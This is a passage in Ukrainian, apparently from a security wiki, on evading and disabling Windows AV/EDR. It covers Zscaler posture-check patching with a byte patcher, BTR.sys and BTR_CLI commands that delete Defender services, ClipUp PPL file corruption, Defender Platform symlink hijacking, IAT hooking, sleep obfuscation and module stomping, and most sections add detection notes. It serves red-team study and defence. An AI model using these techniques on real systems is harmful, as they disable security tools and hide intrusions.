• Стежте за дескрипторами user-mode до спеціальних об’єктів пристроїв і подальшими підозрілими викликами `DeviceIoControl`.

### Обхід перевірок стану пристрою Zscaler Client Connector за допомогою виправлення бінарних файлів на диску

**Client Connector** від Zscaler локально застосовує правила стану пристрою й покладається на Windows RPC для передавання результатів іншим компонентам. Два слабкі рішення в дизайні уможливлюють повний обхід:

1. Оцінювання стану пристрою відбувається **цілком на стороні клієнта** (на сервер надсилається логічне значення).
2. Внутрішні кінцеві точки RPC лише перевіряють, чи **підписаний Zscaler** виконуваний файл, що підключається (за допомогою `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Виправивши чотири підписані бінарні файли на диску**, можна нейтралізувати обидва механізми:

| Бінарний файл | Початкова логіка, яку виправлено | Результат |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Завжди повертає `1`, тож усі перевірки проходять |
| `ZSAService.exe` | Непрямий виклик `WinVerifyTrust` | Замінено на NOP ⇒ будь-який процес (навіть непідписаний) може підключатися до каналів RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Замінено на `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Перевірки цілісності тунелю | Обійдено |

Фрагмент мінімального патчера:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Після заміни оригінальних файлів і перезапуску стека служб:

* **Усі** перевірки стану показують **зелений/відповідний вимогам** статус.
* Непідписані або змінені бінарні файли можуть відкривати кінцеві точки RPC через іменований канал (наприклад, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Скомпрометований хост отримує необмежений доступ до внутрішньої мережі, визначеної політиками Zscaler.

Цей приклад демонструє, як кількома патчами байтів можна обійти суто клієнтські рішення щодо довіри та прості перевірки підпису.

## Зловживання довіреною функціональністю Microsoft Defender `BTR.sys`

Драйвер Defender **Boot-Time Removal** — корисний контрприклад класичному BYOVD. `BTR.sys` — легітимний компонент усунення загроз, підписаний Microsoft, без помилки пошкодження пам’яті та інтерфейсу IOCTL; натомість, отримавши права адміністратора та `SeLoadDriverPrivilege`, оператор може підробити його приватну транзакцію усунення загроз і виконати передбачені операції з файлами та реєстром у Ring-0. Це **примітив нейтралізації AV/EDR після компрометації, а не початковий доступ чи підвищення привілеїв**, а драйвер можна витягти з ресурсу `BOOTTIMETOOL` у власному `MpEngine.dll` цільової системи, а не імпортувати помітний сторонній драйвер.<sup>[[36]](#references)</sup>

### Підготовка одноразового драйвера

Зазвичай Defender зберігає ресурс у файлі з випадковим іменем `[a-z]{8}.sys` і реєструє службу ядра з подібним іменем. `DriverEntry` читає значення `Args` служби, відкриває вказаний альтернативний потік даних NTFS (ADS), розшифровує та перевіряє список дій, записує зворотний зв’язок і після успішного виконання повертає `0xC0000056` (`STATUS_DELETE_PENDING`), щоб драйвер вивантажився, а не залишався резидентним. Підроблена служба має такі характерні значення.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Потік `:changelist` містить один зашифрований RC4 blob. В аналізованих збірках повторно використовується фіксований 256-байтовий ключ, тому шифрування не є межею авторизації. Коректний plaintext має 24-байтовий глобальний заголовок (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC заголовка та ID транзакції, похідний від payload), за яким ідуть шлях відгуку у форматі UTF-16 із нульовим термінатором і довільна кількість елементів. Кожен елемент має 16-байтовий заголовок (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) і дані, специфічні для дії, що закінчуються **рівно чотирма нульовими байтами**. Кожна область заголовка/даних перевіряється окремо за допомогою CRC-32 з поліномом `0xEDB88320`, початковим станом `0xFFFFFFFF` і **без фінального XOR** (`~CRC32`); стан CRC скидається для кожної області.<sup>[[36]](#references)[[37]](#references)</sup>

Прийняті ID дій відкривають доступ до таких примітивів ядра.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Дані елемента | Результат |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Видалити файл, зокрема заблокований |
| 2 | `[UTF-16 path]` | Видалити порожній каталог |
| 3 | `[Flags][source][destination]` | Перемістити файл до вибраного зловмисником захищеного шляху; порожнє призначення означає видалення |
| 4 | `[Flags][key path]` | Рекурсивно видалити ключ реєстру |
| 5 | `[Flags][key path + "\\" + value]` | Видалити значення реєстру |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Створити/оновити значення реєстру та створити відсутні шляхи ключів |

Для дій 5 і 6 роздільник ключа/значення у форматі on-wire — це **дві послідовні зворотні скісні риски**; шлях, відформатований за звичайними правилами, не буде розділено коректно. Файл відгуку здебільшого відображає запит, але перші чотири байти даних кожного елемента стають його результатом `NTSTATUS`. Для дій 1 і 2, у яких немає початкового поля flags, BTR переміщує шлях у чотири зарезервовані кінцеві байти, щоб звільнити місце для цього статусу.<sup>[[36]](#references)</sup>

### Процес `BTR_CLI` і вікно раннього завантаження

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) реалізує весь ланцюжок: видобуває `BTR.sys` із локального Defender, створює `<random>.sys:changelist` і потік відгуку, серіалізує/контрольними сумами перевіряє/шифрує послідовність дій, безпосередньо створює ключ реєстру служби, а потім викликає `NtLoadDriver` для `-trigger now` або залишає драйвер для запуску під час старту системи з параметром `-trigger boot`. Пряме налаштування реєстру оминає стандартний шлях SCM `CreateServiceW`, тож **не генерує** подію встановлення служби з ID 7045. Артефакти, створені для запуску під час завантаження, згодом можна видалити за допомогою `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` непридатний, оскільки BTR виконує файлові операції з `DriverEntry` ще до того, як стек сховища та посилання `SystemRoot` будуть готові. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` натомість забезпечує виконання на Phase 1: NTFS уже доступна, але багато драйверів безпеки із запуском на етапі завантаження та служб EDR у режимі користувача ще не ініціалізувалися. Фільтри із запуском під час завантаження, як-от `WdFilter`, можуть бути вже завантажені, але BTR може видалити їхні бінарні файли або конфігурацію служб до наступного запуску, а також видалити виконувані файли служб до того, як їх запустить SCM. ELAM не усуває цю прогалину, оскільки BTR запускається після перевірки драйверів під час завантаження та має чинний підпис Microsoft.<sup>[[36]](#references)</sup>

Кілька дій виконуються в межах однієї транзакції. У PoC перед Action 1 додається запит для жорстко заданого шляху `\SystemRoot\Temp\BootClean.log`: BTR створює цей журнал, потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує обсяг доказів, а зберігання телеметрії у `<random>.sys:<random>.dat` дає змогу видалити драйвер і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Кореляції для виявлення з високою точністю

Правила, що спираються лише на підпис, і список блокування вразливих драйверів Microsoft не запобігають зловживанню передбаченою функціональністю BTR. Надавайте перевагу наведеним нижче поведінковим кореляціям, відрізняючи легітимне походження від Defender від запуску довільним процесом.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальним для розгортання BTR. Особливо підозрілий потік ADS `.dat`, прикріплений до того самого `.sys`, оскільки легітимний Defender зазвичай зберігає телеметрію в `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте пряме створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, за відсутності відповідної події встановлення SCM.
- **Sysmon 6 -> 23:** корелюйте завантаження відомого драйвера BTR із процесу, що не належить до ланцюжка походження Defender, із подальшим видаленням файлів, приписаним `System`/PID 4, особливо якщо йдеться про бінарні файли засобів безпеки.
- **Sysmon 11 -> 23:** сповіщайте про швидке створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте й аудіюйте призначення та ввімкнення `SeLoadDriverPrivilege`; одного лише підпису Microsoft недостатньо, щоб вважати драйвер надійним, якщо драйвер засобу безпеки розгортає `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) забезпечує ієрархію підписувачів і рівнів, завдяки якій втручатися один в одного можуть лише захищені процеси з таким самим або вищим рівнем. Зловмисник, який може легітимно запустити бінарний файл із підтримкою PPL і контролювати його аргументи, може перетворити нешкідливу функціональність (наприклад, ведення журналу) на обмежений механізм запису з підтримкою PPL у захищені каталоги, які використовують AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що потрібно, щоб процес працював як PPL
- Цільовий EXE (і всі завантажені DLL) мають бути підписані за допомогою EKU, сумісного з PPL.
- Процес потрібно створити за допомогою CreateProcess із прапорцями: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно вказати сумісний рівень захисту, що відповідає підписувачу бінарного файлу (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для підписувачів засобів захисту від шкідливого програмного забезпечення, `PROTECTION_LEVEL_WINDOWS` для підписувачів Windows). Неправильні рівні призведуть до помилки створення процесу.

Див. також ширший вступ до PP/PPL і захисту LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Інструменти для запуску
- Допоміжний інструмент із відкритим кодом: CreateProcessAsPPL (вибирає рівень захисту та передає аргументи цільовому EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Приклад використання:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Примітив LOLBIN: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає дочірній процес і приймає параметр для запису файлу журналу за вказаним викликачем шляхом.
- Якщо його запустити як процес PPL, запис файлу виконується з привілеями PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Допоміжні засоби для коротких шляхів 8.3
- Переглянути короткі імена: `dir /x` у кожному батьківському каталозі.
- Визначити короткий шлях у cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (узагальнено)
1) Запустіть LOLBIN, здатний працювати як PPL (ClipUp), із прапорцем `CREATE_PROTECTED_PROCESS` за допомогою лаунчера (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент зі шляхом до файлу журналу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо AV зазвичай відкриває/блокує цільовий бінарний файл під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши службу автозапуску, яка гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із привілеями PPL відбудеться до того, як AV заблокує свої бінарні файли, пошкодивши цільовий файл і унеможлививши запуск.

Приклад виклику (шляхи приховано/скорочено з міркувань безпеки):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Нотатки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім місця розташування; цей примітив підходить для пошкодження, а не для точного впровадження вмісту.
- Для встановлення/запуску служби потрібні локальні права адміністратора/SYSTEM і можливість перезавантаження.
- Важливий вибір часу: цільовий файл не має бути відкритим; виконання під час завантаження дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з незвичними аргументами, особливо якщо батьківським процесом є нестандартний launcher, під час завантаження системи або близько до нього.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і такі, що стабільно запускаються раніше за Defender/AV. Перевіряйте створення/зміну служб перед збоями запуску Defender.
- Моніторинг цілісності файлів у каталогах Defender/Platform; неочікуване створення/зміна файлів процесами з прапорцями protected-process.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівнів PPL небінарними файлами AV.

Заходи захисту
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і з якими батьківськими процесами; блокуйте запуск ClipUp поза легітимними контекстами.
- Належне керування службами: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що захист Defender від втручання та механізми раннього запуску увімкнені; перевіряйте помилки запуску, які вказують на пошкодження бінарних файлів.
- Якщо це сумісно з вашим середовищем, розгляньте можливість вимкнення генерації коротких імен 8.3 на томах, де розміщені засоби безпеки (ретельно протестуйте).

## Підміна символічного посилання на папку версії Platform у Microsoft Defender

Windows Defender визначає платформу, з якої він запускається, шляхом переліку підпапок у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підпапку з найвищим лексикографічним рядком версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Цей вибір довіряє записам каталогів, зокрема точкам повторного аналізу каталогів (символічним посиланням). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису зловмиснику, та виконати DLL sideloading або порушити роботу служби.<sup>[[21]](#references)[[22]](#references)</sup>

Передумови
- Локальний Administrator (потрібен для створення каталогів/символічних посилань у папці Platform)
- Можливість перезавантажити систему або запустити повторний вибір платформи Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (`mklink`)

Чому це працює
- Defender блокує запис у власні папки, але під час вибору платформи довіряє записам каталогів і вибирає лексикографічно найвищу версію, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покрокова інструкція (приклад)
1) Підготуйте доступну для запису копію поточної папки платформи, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть усередині Platform символьне посилання на каталог із вищим номером версії, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Розмістіть/замініть DLL, які Defender завантажує з каталогу програми, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть symlink версії, щоб під час наступного запуску налаштований шлях не розв’язався, і Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Зверніть увагу: ця техніка сама по собі не забезпечує підвищення привілеїв; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (у стилі Crystal Kit)

Red-команди можуть перенести runtime evasion з імпланта C2 безпосередньо в цільовий модуль, перехоплюючи його Import Address Table (IAT) і спрямовуючи вибрані API через контрольований зловмисником position-independent code (PIC). Це узагальнює evasion за межі невеликого набору API, доступного в багатьох наборах інструментів (наприклад, CreateProcessA), і поширює такий самий захист на BOF і DLL для post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC-блок поруч із цільовим модулем за допомогою reflective loader (на початку або як супровідний файл). PIC має бути самодостатнім і position-independent.
- Під час завантаження DLL вузлом пройдіть по її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC-обгортки.
- Кожна PIC-обгортка виконує evasion перед передаванням керування реальній адресі API через tail-call. Типові evasion включають:
  - Маскування/зняття маскування пам’яті навколо виклику (наприклад, шифрування ділянок beacon, зміна RWX→RX, назв сторінок/дозволів), а потім відновлення після виклику.
  - Call-stack spoofing: створення нешкідливого стека й перехід до цільового API так, щоб аналіз стека викликів визначав очікувані кадри.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб скрипт Aggressor (або аналогічний) міг реєструвати API для перехоплення в Beacon, BOF і DLL для post-exploitation.

Навіщо тут IAT hooking
- Працює з будь-яким кодом, що використовує перехоплений імпорт, без змін у коді інструмента й без залежності від того, чи проксіює Beacon конкретні API.
- Охоплює DLL для post-exploitation: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати до їхніх викликів API таке саме маскування та evasion стека.
- Відновлює надійне використання команд post-exploitation, що створюють процеси, проти виявлення на основі стека викликів, обгортаючи CreateProcessA/W.

Мінімальний ескіз IAT hook (псевдокод x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте патч після релокацій/ASLR і до першого використання імпорту. Reflective loaders на кшталт TitanLdr/AceLdr демонструють перехоплення під час DllMain завантаженого модуля.
- Робіть обгортки мінімальними й безпечними для PIC; справжній API отримуйте зі значення початкового IAT, збереженого до патчення, або через LdrGetProcedureAddress.
- Для PIC використовуйте переходи RW → RX і не залишайте сторінки одночасно доступними для запису й виконання.

Заглушка для підроблення стека викликів
- PIC-заглушки в стилі Draugr створюють фальшивий ланцюжок викликів (адреси повернення в нешкідливих модулях), а потім переходять до справжнього API.
- Це обходить засоби виявлення, які очікують канонічні стеки від Beacon/BOFs під час викликів чутливих API.
- Поєднуйте це з методами обрізання стека/зшивання стека, щоб опинитися в очікуваних фреймах перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLL, щоб PIC та hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації цільових API, щоб Beacon і BOFs прозоро використовували той самий шлях обходу без змін коду.

Міркування щодо виявлення/DFIR
- Цілісність IAT: записи, що вказують на адреси поза образом (heap/anon); періодична перевірка вказівників імпорту.
- Аномалії стека: адреси повернення, що не належать завантаженим образам; різкі переходи до PIC поза образом; невідповідна ієрархія RtlUserThreadStart.
- Телеметрія завантажувача: записи в IAT зсередини процесу, рання активність DllMain, що змінює import thunks, неочікувані RX-області, створені під час завантаження.
- Обхід завантаження образів: якщо перехоплюється LoadLibrary*, відстежуйте підозрілі завантаження automation/clr assemblies, пов’язані з подіями маскування пам’яті.

Пов’язані будівельні блоки та приклади
- Reflective loaders, що виконують патчення IAT під час завантаження (наприклад, TitanLdr, AceLdr)
- Hooks для маскування пам’яті (наприклад, simplehook) і PIC для обрізання стека (stackcutting)
- PIC-заглушки для підроблення стека викликів (наприклад, Draugr)


## Перехоплення IAT під час імпорту + обфускація сну (Crystal Palace/PICO)

### Hooks IAT під час імпорту через резидентний PICO

Якщо ви контролюєте reflective loader, можна перехоплювати імпорти **під час** `ProcessImports()`, замінивши вказівник `GetProcAddress` завантажувача власним резолвером, який спершу перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **резидентний PICO** (постійний PIC-об’єкт), який зберігається після того, як тимчасовий PIC завантажувача звільнить себе.
- Експортуйте функцію `setup_hooks()`, яка перевизначає резолвер імпорту завантажувача (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте імпорти за ordinal і використовуйте пошук hook за хешем, наприклад `__resolve_hook(ror13hash(name))`. Якщо hook знайдено, поверніть його; інакше передайте виклик справжньому `GetProcAddress`.
- Реєструйте цілі hooks під час компонування за допомогою записів Crystal Palace `addhook "MODULE$Func" "hook"`. Hook залишається дійсним, бо розміщений усередині резидентного PICO.

Це забезпечує **перенаправлення IAT під час імпорту** без патчення секції коду завантаженої DLL після її завантаження.

### Як змусити імпорт, придатний для перехоплення, коли ціль використовує обхід PEB

Hooks під час імпорту спрацьовують, лише якщо функція справді є в IAT цілі. Якщо модуль резолвить API через обхід PEB + хеш (без запису імпорту), примусово створіть справжній імпорт, щоб завантажувач обробив його через `ProcessImports()`:

- Замініть резолвинг експортів за хешем (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Компілятор створить запис IAT, що дасть змогу перехопити імпорт, коли reflective loader резолвить імпорти.

### Обфускація сну/простою в стилі Ekko без патчення `Sleep()`

Замість патчення `Sleep` перехоплюйте **фактичні примітиви очікування/IPC**, які використовує імплант (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалого очікування обгорніть виклик у ланцюжок обфускації в стилі Ekko, який шифрує образ у пам’яті під час простою:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer`, щоб запланувати послідовність callback-функцій, які викликають `NtContinue` із підготовленими фреймами `CONTEXT`.
- Типовий ланцюжок (x64): перевести образ у `PAGE_READWRITE` → зашифрувати RC4 через `advapi32!SystemFunction032` весь зіставлений образ → виконати блокувальне очікування → розшифрувати RC4 → **відновити дозволи для кожної секції**, пройшовши PE-секції → подати сигнал про завершення.
- `RtlCaptureContext` надає шаблон `CONTEXT`; клонуйте його в кілька фреймів і задайте регістри (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте «успіх» для тривалих очікувань (наприклад, `WAIT_OBJECT_0`), щоб викликальник продовжив виконання, поки образ замаскований. Такий шаблон приховує модуль від сканерів під час простою й не має типової сигнатури з «пропатченим `Sleep()`».

Ідеї для виявлення (на основі телеметрії)
- Сплески callback-функцій `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих суміжних буферів розміром з образ.
- `VirtualProtect` для великого діапазону з подальшим відновленням дозволів для окремих секцій.

### Реєстрація CFG під час виконання для гаджетів обфускації сну

У цілях із CFG перший непрямий перехід до гаджета посеред функції, наприклад `jmp [rbx]` або `jmp rdi`, зазвичай призводить до аварійного завершення процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки гаджет відсутній у метаданих CFG модуля. Щоб ланцюжки в стилі Ekko/Kraken працювали в захищених процесах:<sup>[[30]](#references)</sup>

- Зареєструйте всі непрямі адреси призначення, які використовує ланцюжок, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і записи `CFG_CALL_TARGET_VALID`.
- Для адрес у завантажених образах (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **базової адреси образу** й охоплювати **весь розмір образу**.
- Для вручну зіставлених/PIC/stomped-областей використовуйте **базову адресу розміщення** та розмір розміщення.
- Позначте не лише dispatch-гаджет, а й експорти, до яких ведуть непрямі переходи (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, системні виклики очікування/подій), а також будь-які виконувані секції під контролем атакувальника, що стануть цілями непрямих переходів.

Це перетворює ланцюжки сну в стилі ROP/JOP із «працює лише в процесах без CFG» на багаторазово використовуваний примітив для `explorer.exe`, браузерів, `svchost.exe` та інших кінцевих систем, скомпільованих із `/guard:cf`.

### Підроблення стека для сплячих потоків із підтримкою CET

Повна заміна `CONTEXT` створює помітну активність і може порушити роботу систем із CET Shadow Stack, оскільки підроблений `Rip` усе одно має відповідати апаратному shadow stack. Безпечніший шаблон маскування під час сну:<sup>[[30]](#references)</sup>

- Виберіть інший потік у тому самому процесі й отримайте межі його стека `NT_TIB` / TEB (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть справжній TEB/TIB поточного потоку.
- Зафіксуйте справжній контекст потоку, що засинає, за допомогою `GetThreadContext`.
- Скопіюйте в контекст для підроблення **лише** справжній `Rip`, залишивши підроблений стан `Rsp`/стека без змін.
- Під час сну скопіюйте `NT_TIB` підробленого потоку в TEB поточного потоку, щоб обхідчики стека розкручували стек у межах справжнього діапазону.
- Після завершення очікування відновіть початкові TIB і контекст потоку.

Це зберігає узгоджений із CET вказівник інструкцій, водночас вводячи в оману обхідчики стека EDR, які покладаються на метадані стека TEB для перевірки розкручування стека.

### Альтернатива на основі APC: Kraken Mask

Якщо диспетчеризація через чергу таймерів має надто впізнавану сигнатуру, ту саму послідовність «сон-шифрування-підроблення-відновлення» можна виконати в призупиненому допоміжному потоці за допомогою поставлених у чергу APC:<sup>[[27]](#references)</sup>

- Створіть допоміжний потік із `NtTestAlert` як точкою входу.
- Поставте підготовлені фрейми `CONTEXT`/APC у чергу через `NtQueueApcThread` і виконайте їх через `NtAlertResumeThread`.
- Зберігайте стан ланцюжка в heap, а не в стеку допоміжного потоку, щоб не вичерпати стандартний стек потоку розміром 64 KB.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про початок і заблокуватися.
- Призупиніть головний потік перед відновленням TIB/контексту (`NtSuspendThread` → відновлення → `NtResumeThread`), щоб скоротити вікно гонки, коли сканер може виявити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру допоміжного потоку/APC, зберігаючи ті самі цілі маскування через RC4 і підроблення стека.

Додаткові ідеї для виявлення
- Виклик `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до сну, очікування або диспетчеризації APC.
- `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- Виклик `NtQueryInformationThread` із подальшими прямими записами в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, що непрямо викликають `SystemFunction032`, `VirtualProtect` або допоміжні функції для відновлення дозволів секцій.
- Повторне використання коротких сигнатур гаджетів, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як точок переходу всередині підписаних модулів.


## Точне стомплення модулів

Стомплення модулів виконує payload із **секції `.text` DLL, уже зіставленої в цільовому процесі**, замість виділення очевидної приватної виконуваної пам’яті або завантаження нової DLL-жертви. Ціль перезапису має бути **завантаженим образом, підкріпленим файлом на диску**, чий простір коду вмістить payload, не пошкодивши потрібні процесу шляхи виконання.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївне стомплення поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійне: DLL може бути не завантажена у віддалений процес, а надто мала область коду призведе до аварійного завершення процесу. Надійніший процес:

1. Перелічіть модулі цільового процесу та залиште **список включення лише з назвами** вже завантажених DLL.
2. Спочатку зберіть payload і зафіксуйте його **точний розмір у байтах**.
3. Проскануйте DLL-кандидати на диску й порівняйте **`.text` `Misc_VirtualSize`** PE-секції з розміром payload. Це важливіше за розмір файлу, оскільки відображає розмір виконуваної секції **після зіставлення в пам’яті**.
4. Розберіть **таблицю адрес експорту (EAT)** і виберіть RVA експортованої функції як початкове зміщення для стомплення.
5. Оцініть **радіус ураження**: якщо payload перевищує межі вибраної функції, він перезапише сусідні експорти, розташовані після неї в пам’яті.

Типові допоміжні засоби для розвідки/вибору цілі, що трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні примітки
- Надавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Надавайте перевагу експорту, який цільова програма викликає рідко, інакше звичайні шляхи виконання можуть звернутися до перезаписаних байтів до або після створення потоку.
- Для великих імплантів часто потрібно змінити вбудовування shellcode зі строкового літерала на **ініціалізатор масиву байтів або фігурних дужок**, щоб у вихідному коді інжектора правильно представити весь буфер.

Ідеї для виявлення
- Віддалений запис у **виконувані сторінки, прив’язані до образу** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість поширеніших приватних виділень RWX/RX.
- Точки входу експорту, байти яких у пам’яті більше не збігаються з відповідними байтами у файлі на диску.
- Віддалені потоки або перемикання контексту, що починають виконання всередині експорту легітимної DLL, перші байти якого нещодавно змінили.
